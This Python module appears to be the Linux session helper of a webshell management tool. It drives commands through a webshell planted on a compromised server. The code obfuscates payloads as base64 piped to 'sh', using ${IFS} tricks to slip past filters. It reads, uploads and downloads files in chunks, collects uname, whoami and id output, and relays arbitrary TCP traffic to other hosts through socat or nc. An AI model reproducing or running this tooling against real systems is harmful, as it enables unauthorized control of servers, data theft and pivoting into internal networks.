import asyncio
import typing as t
import logging
import base64
import shlex
import hashlib

from ..core import exceptions

from ..core.base import (
    DirectoryEntry,
    BasicInfoEntry,
)

from ..utils.random_data import random_string

logger = logging.getLogger("core.sessions.linux_shell_helper")

WRAPPER_CODE = """
echo -n "{start1}""{start2}";
({code}) {decoder}
echo {stop}
"""

UPLOAD_FILE_CHUNK_CODE = """
file=`mktemp`
echo {chunk_b64} | base64 -d > $file
echo DONE "$file"
""".strip()

UPLOAD_FILE_MERGE_CODE = """
cat {files} > {filepath}
rm {files}
"""

UPLOAD_FILE_CHECK_CODE = """
which md5sum >/dev/null || echo no_md5sum
md5sum {filepath}
"""

DOWNLOAD_FILE_CHUNK_CODE = """
tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED
"""

GET_BASICINFO_CODE = """
for cmd in {cmds}
do
  echo "start$cmd|"$($cmd | base64 -w 0)"stop"
done
"""

def shell_command(args: t.List[str]) -> str:
    return " ".join(shlex.quote(arg) for arg in args)


def parse_file_permission(perm: str) -> str:
    result = ""
    for i in range(0, 9, 3):
        part = perm[i : i + 3]
        digit_bin = "".join("0" if c == "-" else "1" for c in part)
        result += str(int(digit_bin, 2))
    return result


class LinuxShellHelper:
    def __init__(
        self,
        transport_fn: t.Callable[[str], t.Awaitable[str]],
        max_coro: t.Union[int, None],
        encoder: str = "raw",
        decoder: str = "raw",
        chunk_size: int = 1024,
    ):
        self._transport = transport_fn
        self.encoder = encoder
        self.decoder = decoder
        self.chunk_size = chunk_size
        self.max_coro = max_coro

    async def submit(self, payload: t.Union[str, t.List[str]]) -> str:
        start1, start2, stop = random_string(6), random_string(6), random_string(12)
        code = WRAPPER_CODE.format(
            start1=start1,
            start2=start2,
            code=payload if isinstance(payload, str) else shell_command(payload),
            stop=stop,
            decoder={"raw": "", "base64": "|base64 -w0"}.get(self.decoder, ""),
        )
        if self.encoder == "base64_quote":
            code = shell_command(
                [
                    "sh",
                    "-c",
                    "echo "
                    + base64.b64encode(code.encode()).decode()
                    + "|base64 -d|sh",
                ]
            )
        elif self.encoder == "base64_ifs":
            code = (
                "sh -c echo${IFS}"
                + base64.b64encode(code.encode()).decode()
                + "|base64${IFS}-d|sh"
            )
        elif self.encoder == "raw":
            pass
        else:
            raise exceptions.UserError("未知encoder: " + self.encoder)

        result = await self._transport(code)

        if (start1 + start2) not in result:
            logger.debug(f"Transport response: {result}")
            raise exceptions.PayloadOutputError(
                "找不到输出文本的开头，也许webshell没有执行代码？"
            )
        result_body = result[result.index(start1 + start2) + len(start1 + start2) :]
        if stop not in result_body:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的结尾，也许webshell没有执行代码？"
            )
        todecode = result_body[: result_body.index(stop)].removeprefix("\n")

        if self.decoder == "base64":
            return base64.b64decode(todecode).decode()
        if self.decoder == "raw":
            return todecode
        raise exceptions.UserError("未知Decoder: " + self.decoder)

    async def execute_cmd(self, cmd: str) -> str:
        return await self.submit(cmd)

    async def test_usablility(self) -> bool:
        toprint = random_string(12)
        return toprint in (await self.submit(["echo", toprint]))

    async def get_pwd(self) -> str:
        return (await self.submit("pwd")).strip()

    async def _list_dir(self, dir_path: str) -> t.Union[t.List[DirectoryEntry], None]:
        command_output = await self.submit(
            shell_command(["ls", "-la", dir_path]) + " && echo finished"
        )
        result = []
        if "finished" not in command_output:
            return None
        for line in command_output.splitlines():
            parts = line.split(maxsplit=8)
            if len(parts) < 9:
                continue
            perm = parts[0]
            filesize = parts[4]
            name = parts[8]

            if not filesize.lstrip("-").isdigit():
                raise exceptions.FileError("无法解析文件大小")
            filesize = int(filesize)

            filetype = perm[0]
            perm = parse_file_permission(perm[1:10])
            filetype = {
                "-": "file",
                "f": "file",
                "d": "dir",
                "l": "link",
            }.get(filetype, "unknown")
            if filetype == "link":
                filetype = "link-dir" if name.endswith("/") else "link-file"
                name = name.split(" ->")[0]
            result.append(
                DirectoryEntry(
                    name=name,
                    permission=perm,
                    filesize=int(filesize),
                    entry_type=filetype,
                )
            )
        return result

    async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
        result = await self._list_dir(dir_path)
        if result:
            return result
        return [
            DirectoryEntry(name="..", permission="555", filesize=-1, entry_type="dir")
        ]

    async def mkdir(self, dir_path: str) -> None:
        result = await self.submit(
            shell_command(["mkdir", dir_path]) + " && echo finished"
        )
        if result.strip() != "finished":
            raise exceptions.FileError("创建文件夹失败")

    async def get_file_contents(
        self, filepath: str, max_size: int = 1024 * 200
    ) -> bytes:
        ls_result = await self.list_dir(filepath)
        if not ls_result or ls_result[0].filesize > max_size:
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        content_b64 = await self.submit(["base64", "-w", "0", filepath])
        return base64.b64decode(content_b64)

    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
        content_b64 = base64.b64encode(content).decode()
        cmd = (
            f"{shell_command(['echo', content_b64])} | "
            + f"base64 -d > {shlex.quote(filepath)} && echo finished"
        )
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def modify_file(
        self,
        filepath: str,
        old_str: str,
        new_str: str,
        replace_strategy: t.Union[str, None] = None,
    ) -> None:
        content = await self.get_file_contents(filepath)
        text = content.decode("utf-8", errors="replace")
        count = text.count(old_str)
        if replace_strategy is None and count != 1:
            raise exceptions.FileError(f"旧字符串出现了{count}次，不符合恰好一次的要求")
        if count == 0:
            raise exceptions.FileError("在文件中找不到旧字符串")
        if replace_strategy == "once":
            text = text.replace(old_str, new_str, 1)
        else:
            text = text.replace(old_str, new_str)
        await self.put_file_contents(filepath, text.encode("utf-8"))

    async def delete_file(self, filepath: str) -> bool:
        cmd = shell_command(["rm", filepath]) + " && echo finished"
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def move_file(self, filepath: str, new_filepath: str) -> None:
        cmd = shell_command(["mv", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("移动失败")

    async def copy_file(self, filepath: str, new_filepath: str) -> None:
        cmd = shell_command(["cp", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("移动失败")

    async def chmod(self, filepath: str, mode: str) -> None:
        cmd = shell_command(["chmod", mode, filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("修改权限失败")

    async def upload_file(
        self,
        filepath: str,
        content: bytes,
        callback: t.Union[t.Callable, None] = None,
    ) -> bool:
        result_touch = await self.submit(
            shell_command(["touch", filepath]) + " && echo finished"
        )
        if result_touch.strip() != "finished":
            raise exceptions.FileError("文件上传失败：无法新建文件")

        sem = asyncio.Semaphore(self.max_coro) if self.max_coro else None
        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def upload_chunk(chunk: bytes) -> str:
            nonlocal done_coro, done_bytes
            code = UPLOAD_FILE_CHUNK_CODE.format(
                chunk_b64=base64.b64encode(chunk).decode()
            )
            if sem:
                async with sem:
                    await asyncio.sleep(0.01)
                    submit_result = await self.submit(code)
            else:
                await asyncio.sleep(0.01)
                submit_result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            submit_result = submit_result.strip()
            if not submit_result.startswith("DONE"):
                raise exceptions.FileError("上传分块失败")

            return submit_result.removeprefix("DONE").strip()

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        code = UPLOAD_FILE_MERGE_CODE.format(
            files=shell_command(uploaded_chunks), filepath=shlex.quote(filepath)
        )
        await self.submit(code)
        checkfile = await self.submit(
            UPLOAD_FILE_CHECK_CODE.format(filepath=shlex.quote(filepath))
        )
        if "no_md5sum" in checkfile:
            return True
        if hashlib.md5(content).hexdigest() not in checkfile:
            raise exceptions.FileError("上传失败：MD5验证失败")
        return True

    async def download_file(
        self, filepath: str, callback: t.Union[t.Callable, None] = None
    ) -> bytes:
        ls_result = await self.list_dir(filepath)
        if not ls_result:
            raise exceptions.FileError("读取文件大小失败，也许文件不存在？")
        filesize = ls_result[0].filesize

        sem = asyncio.Semaphore(self.max_coro) if self.max_coro else None
        write_state_lock = asyncio.Lock()
        chunk_size = self.chunk_size
        done_coro = 0
        done_bytes = 0
        coros: t.List[t.Awaitable] = []

        async def download_chunk(offset: int) -> bytes:
            nonlocal done_coro, coros, done_bytes
            code = DOWNLOAD_FILE_CHUNK_CODE.format(
                offset=offset,
                filepath=shlex.quote(filepath),
                chunk_size=str(chunk_size),
            )
            if sem:
                async with sem:
                    await asyncio.sleep(0.01)
                    dl_result = await self.submit(code)
            else:
                await asyncio.sleep(0.01)
                dl_result = await self.submit(code)
            async with write_state_lock:
                done_coro += 1
                done_bytes += chunk_size
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )
            if "#FAILED" in dl_result:
                raise exceptions.FileError("无法读取文件")
            if not dl_result.strip():
                raise exceptions.FileError("无法base64解码分块")
            return base64.b64decode(dl_result.strip())

        coros = [download_chunk(i) for i in range(1, filesize + 1, chunk_size)]
        chunks = await asyncio.gather(*coros)
        return b"".join(chunks)

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        result = await self.submit(
            "command -v socat >/dev/null 2>&1 && echo HAS_SOCAT; "
            "command -v nc >/dev/null 2>&1 && echo HAS_NC; "
            "command -v base64 >/dev/null 2>&1 && echo HAS_BASE64"
        )
        methods: t.List[str] = []
        if "HAS_SOCAT" in result and "HAS_BASE64" in result:
            methods.append("socat")
        if "HAS_NC" in result and "HAS_BASE64" in result:
            methods.append("nc")
        return methods

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        content_b64 = base64.b64encode(content).decode()
        host_q = shlex.quote(host)
        port_str = str(port)

        if send_method is not None:
            methods_to_try = [send_method]
        else:
            methods_to_try = await self.get_send_tcp_support_methods()
            if not methods_to_try:
                raise exceptions.ServerError(
                    "无法发送TCP数据：目标系统没有可用的工具（需要socat或nc及base64）"
                )

        for method in methods_to_try:
            if method == "socat":
                cmd = (
                    f"echo {content_b64} | base64 -d"
                    f" | socat - TCP:{host_q}:{port_str},connect-timeout=5"
                    f" | base64 -w0"
                )
            elif method == "nc":
                cmd = (
                    f"echo {content_b64} | base64 -d"
                    f" | nc -w 5 {host_q} {port_str}"
                    f" | base64 -w0"
                )
            else:
                raise exceptions.UserError(f"未知的TCP发送方法: {method}")

            result = await self.submit(cmd)
            if result.strip():
                return base64.b64decode(result.strip())

        return None

    async def get_basicinfo(self) -> t.List[BasicInfoEntry]:
        cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
        info = GET_BASICINFO_CODE.format(cmds=shell_command(cmds))
        result = []
        for line in (await self.submit(info)).splitlines():
            line = line.strip().removeprefix("start").removesuffix("stop")
            if "|" not in line:
                continue
            cmd, output_b64 = line.split("|", maxsplit=1)
            if not output_b64.strip():
                continue
            output = base64.b64decode(output_b64.strip()).decode()
            result.append(BasicInfoEntry(key=cmd, value=output))
        return result
